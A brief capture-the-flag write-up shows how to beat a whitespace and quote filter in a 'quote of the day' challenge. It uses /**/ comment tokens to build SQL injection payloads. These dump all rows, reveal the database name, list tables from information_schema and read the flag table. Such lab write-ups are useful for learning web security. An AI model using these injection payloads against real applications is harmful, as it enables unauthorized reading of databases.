Now quotes and whitespaces are filtering. I looked a bit at another writeup and saw a perfect solution to pass filter:
<pre>
../?q=5512/**/or/**/true
</pre>
This query will print all quotes of the day.<br>
Let's know a db name:
<pre>
../?q=8/**/and/**/false/**/union/**/select/**/123,database()
</pre>
Now fetch tables:
<pre>
../?q=8/**/and/**/false/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()
</pre>
Ok, let's get a flag:
<pre>
?q=8/**/and/**/1=2/**/union/**/select/**/*/**/from/**/alkdjf4iu
</pre>
GL